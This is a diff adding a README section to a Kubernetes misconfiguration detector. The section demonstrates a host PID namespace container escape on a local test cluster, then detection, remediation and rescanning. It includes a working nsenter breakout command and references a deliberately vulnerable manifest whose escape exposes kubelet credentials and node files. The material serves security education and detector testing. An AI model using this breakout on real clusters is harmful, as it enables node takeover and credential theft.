@@ -493,6 +493,127 @@ Best when you have already trained and serialized a model to `best_nlp_model.pkl
 ```bash
 python3 hybrid_detection_pipeline.py
 ```
+## Attack Path Demonstration: Host PID Namespace Breakout
+
+This section walks through a real container escape attack that the detector flags as `privilege_exposure`. The goal is to show *why* the misconfigurations in `demo/attack/vulnerable.yaml` matter — not just that they exist.
+
+> **Warning:** Run this only against a local, throwaway cluster (minikube or kind). Never deploy `vulnerable.yaml` against a shared or production cluster.
+
+### Attack Overview
+
+The vulnerable pod combines two settings that, together, give a container full control over the host node:
+
+- `hostPID: true` — the pod shares the host's process namespace, so it can see and signal every process running on the node
+- `privileged: true` — the container runs with all Linux capabilities and unrestricted device access
+
+Either setting alone is risky. Combined, they allow a process inside the container to enter the host's mount namespace and execute commands as root on the underlying node. This is the canonical "host PID breakout" pattern.
+
+### Prerequisites
+
+- A local Kubernetes cluster (minikube or kind)
+- `kubectl` configured against that cluster
+- The vulnerable manifest at `demo/attack/vulnerable.yaml`
+
+Apple Silicon users: make sure your minikube/kind binary is `darwin-arm64`. An `amd64` binary will fail with an architecture mismatch when starting the Docker driver.
+
+Start a clean cluster:
+
+```bash
+minikube start --driver=docker
+```
+
+### Step 1: Deploy the Vulnerable Pod
+
+```bash
+kubectl apply -f demo/attack/vulnerable.yaml
+kubectl get pods
+```
+
+Wait for the pod to reach `Running` state. This pod intentionally requests `hostPID: true` and `privileged: true` — Kubernetes admits it because no admission policy is enforced by default.
+
+### Step 2: Confirm Host PID Visibility
+
+Exec into the pod and list processes:
+
+```bash
+kubectl exec -it <pod-name> -- /bin/sh
+ps -ef | head -20
+```
+
+You should see node-level processes (`kubelet`, `systemd`, `containerd`, etc.) — not just the container's own PID 1. This confirms the container is sharing the host's PID namespace.
+
+### Step 3: Escape to the Host
+
+From inside the container, use `nsenter` to enter PID 1's mount, UTS, IPC, and network namespaces — effectively giving you a shell on the host node:
+
+```bash
+nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
+```
+
+You are now executing on the host node as root. Verify:
+
+```bash
+hostname
+cat /etc/os-release
+ls /var/lib/kubelet/
+```
+
+The hostname will be the node's name (e.g., `minikube`), not the pod name. You can read kubelet credentials, container runtime sockets, and any data on the node's filesystem.
+
+### Step 4: Detect the Misconfiguration
+
+Run the hybrid detector against the vulnerable manifest:
+
+```bash
+mkdir -p k8s_yaml_only
+cp demo/attack/vulnerable.yaml k8s_yaml_only/demo-vulnerable.yaml
+python3 hybrid_detection_pipeline.py
+```
+
+Inspect `hybrid_detection_report.json` for `demo-vulnerable.yaml`. Expected output:
+
+- `final_label`: `privilege_exposure`
+- `final_severity`: `HIGH`
+- privilege findings citing `privileged: true`, `hostPID: true`, `hostNetwork: true`, and the `/var/run/docker.sock` mount
+- remediation guidance for each finding
+
+
+### Step 5: Apply the Fix and Re-scan
+
+Replace the vulnerable pod with the remediated version:
+
+```bash
+kubectl delete -f demo/attack/vulnerable.yaml
+kubectl apply -f demo/attack/fixed.yaml
+```
+
+The fixed manifest sets `privileged: false`, `allowPrivilegeEscalation: false`, `hostPID: false`, `hostNetwork: false`, and uses a Kubernetes `secretName` reference instead of host mounts.
+
+Re-scan to confirm the detector now labels it as `secure`:
+
+```bash
+cp demo/attack/fixed.yaml k8s_yaml_only/demo-fixed.yaml
+python3 hybrid_detection_pipeline.py
+```
+
+`demo-fixed.yaml` should report `final_label: secure` with no privilege findings.
+
+### Cleanup
+
+```bash
+kubectl delete -f demo/attack/fixed.yaml
+minikube stop
+```
+
+### Why This Attack Path Matters
+
+Host PID + privileged is one of the most common real-world Kubernetes escape vectors because:
+
+- both flags are valid Kubernetes API fields, so RBAC alone won't block them
+- many legitimate workloads (logging agents, monitoring sidecars) request *one* of these flags, normalizing their use
+- without Pod Security Admission, OPA/Gatekeeper, or Kyverno policies, a single over-permissioned pod compromises the entire node
+
+This is exactly the gap that static YAML analysis — like this project's hybrid detector — is designed to close: catch the misconfiguration before the manifest ever reaches the cluster.
 
 ## Current Model Setup
 
